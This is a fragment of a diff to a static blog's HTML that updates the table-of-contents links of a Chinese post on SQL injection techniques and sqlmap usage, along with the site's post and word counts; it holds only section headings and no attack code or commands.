href="#%E6%B3%84%E9%9C%B2%E5%8E%9F%E8%AF%AD-2"><span class="nav-text">泄露原语</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL-%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81%E8%A7%84%E5%88%99"><span class="nav-text">MySQL 中的编码规则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86-1"><span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%8E%9F%E8%AF%AD-3"><span class="nav-text">泄露原语</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E4%BD%BF%E7%94%A8"><span class="nav-text">sqlmap 使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GET-%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">GET 型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E7%9B%AE%E6%A0%87"><span class="nav-text">单目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E7%9B%AE%E6%A0%87"><span class="nav-text">多目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E7%99%BB%E5%BD%95"><span class="nav-text">需要登录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST-%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">POST 型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#head-%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-text">head 头注入</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-text">确定显示位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%8E%9F%E8%AF%AD"><span class="nav-text">泄露原语</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">宽字节注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%8E%9F%E8%AF%AD-1"><span class="nav-text">泄露原语</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E4%BD%BF%E7%94%A8"><span class="nav-text">sqlmap 使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#get-%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">GET 型注入</span></a></li></ol>
 
     </div>
 </div>
@@ -940,11 +1046,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        19 posts in total
+                        21 posts in total
                     </span>
                     
                         <span>
-                            319.9k words in total
+                            347.5k words in total
                         </span>
                     
                 </p>
